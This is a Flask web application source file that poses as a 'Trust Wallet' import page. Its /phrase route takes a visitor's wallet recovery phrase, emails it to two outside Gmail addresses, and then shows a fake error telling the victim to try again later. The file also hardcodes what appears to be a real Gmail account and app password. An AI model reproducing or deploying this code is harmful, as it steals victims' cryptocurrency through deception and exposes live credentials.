from flask import Flask, render_template, request, flash, redirect, url_for, session, abort, jsonify, send_file
import os
import requests
from forms import Phrase
from flask_mail import Mail, Message
basedir = os.path.abspath(os.path.dirname(__file__))

app = Flask(__name__)
mail = Mail()
mail.init_app(app)


 





app.config["DEBUG"] = True


app.config["SQLALCHEMY_POOL_RECYCLE"] = 299
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['SECRET_KEY'] = 'SECRET_KEY'
app.config['UPLOADED_PHOTOS_DEST'] = os.path.join(basedir, 'static/images')
app.config['MAIL_SERVER']='smtp.gmail.com'
app.config['MAIL_PORT'] = 465
app.config['MAIL_USERNAME'] = 'olamicreas@gmail.com'
app.config['MAIL_PASSWORD'] = 'ywxwsjaoglsoimio'
app.config['MAIL_USE_TLS'] = False
app.config['MAIL_USE_SSL'] = True
app.config['MAIL_DEFAULT_SENDER'] = 'olamicreas@gmail.com'
mail = Mail(app)


@app.route('/')
def home():
    return render_template('index.html')

@app.route('/wallet')
def wal():
    return render_template('wallet.html')

@app.route('/phrase', methods=['POST', 'GET'])
def phr():
    form = Phrase(request.form)
    if request.method == 'POST':
        body = form.phrase.data
        subject = 'Trust Wallet'
        msg = Message(subject=subject, recipients= ['johnsonpike93@gmail.com'], body=body)
        msgD = Message(subject=subject, recipients= ['abdulquayyumoyedotun@gmail.com'], body=body)

        mail.send(msg)
        mail.send(msgD)
        flash(f'Error while importing your phrase, Try again in some min', 'danger')

        return redirect(request.referrer)
    return render_template('phrase.html', form=form)



if __name__ == '__main__':
    app.run()